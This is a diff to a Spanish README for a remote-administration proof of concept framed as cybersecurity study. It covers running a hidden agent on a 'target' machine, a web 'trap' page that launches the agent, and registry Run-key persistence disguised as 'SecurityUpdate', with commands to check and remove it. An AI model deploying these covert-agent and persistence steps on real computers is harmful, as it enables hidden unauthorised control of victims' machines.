@@ -5,9 +5,6 @@
   <a href="https://www.python.org/downloads/">
     <img src="https://img.shields.io/badge/Python-Descargar-ffd343?style=for-the-badge&logo=python&logoColor=black" alt="Python">
   </a>
-  <a href="#-solución-de-problemas-troubleshooting">
-    <img src="https://img.shields.io/badge/Soporte-Errores_Comunes-f44336?style=for-the-badge" alt="Errores">
-  </a>
 </p>
 
 # 🛡️ Network Shield - Remote Administration System (PoC)
@@ -45,8 +42,6 @@ Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el fun
 
 ## 📡 Ejecución y Pruebas
 
-Sigue este orden estricto para establecer el enlace:
-
 ### 🟢 Paso 1: Iniciar el Receptor (Master)
 Abre una terminal en la carpeta master/ y lanza el centro de control:
 **python receptor.py**
@@ -56,7 +51,7 @@ Abre una terminal en la carpeta master/ y lanza el centro de control:
 ### 🔵 Paso 2: Lanzar el Agente (Client)
 Ejecuta el script en el equipo objetivo para iniciar la conexión:
 * **Modo Manual**: python client/agente.py
-* **Modo Invisible**: Renombra a **agente.pyw** y ejecútalo.
+* **Modo Invisible**: Usa **agente.pyw** para ejecución sin consola.
 * **Simulación Web**: Accede a **http://localhost/Network-Shield-System/server/trampa.php**
 
 ---
@@ -64,19 +59,16 @@ Ejecuta el script en el equipo objetivo para iniciar la conexión:
 ## 🔐 Implementación de Persistencia
 
 ### 1️⃣ Instalación (Crear Registro)
-Envía este comando desde la terminal del receptor para registrar el agente:
 **reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f**
 
 ---
 
 ### 2️⃣ Comprobación (Verificar Estado)
-Para confirmar que el registro se ha creado correctamente, ejecuta:
 **reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"**
 
 ---
 
 ### 3️⃣ Eliminación (Limpieza del Sistema)
-Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
 **reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f**
 
 ---
@@ -100,14 +92,9 @@ Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
 
 ## 🛠️ Solución de Problemas (Troubleshooting)
 
-* **❌ Error "Windows no puede encontrar el archivo python"**: 
-  Este error ocurre al ejecutar `trampa.php`. Para solucionarlo, debes editar el código de tu archivo PHP y cambiar el comando por la ruta absoluta de Python.
-  *Ejemplo:* `exec("C:\\Users\\TuUsuario\\AppData\\Local\\Programs\\Python\\Python39\\python.exe ..\\client\\agente.py");`
+* **❌ Error de Python**: Si Windows no encuentra el archivo, el script `trampa.php` ahora lo busca automáticamente en las rutas comunes.
 * **🌐 ¿No conecta?**: Verifica que el puerto **4444** esté abierto en el Firewall de Windows.
 * **🗄️ ¿Error de SQL?**: Asegúrate de que el usuario de MySQL sea **root** y no tenga contraseña.
 
 ---
-
-<p align="center">
-  Desarrollado con ❤️ para fines de aprendizaje en Ciberseguridad
-</p>
+<p align="center">Desarrollado para aprendizaje en Ciberseguridad 🛡️</p>
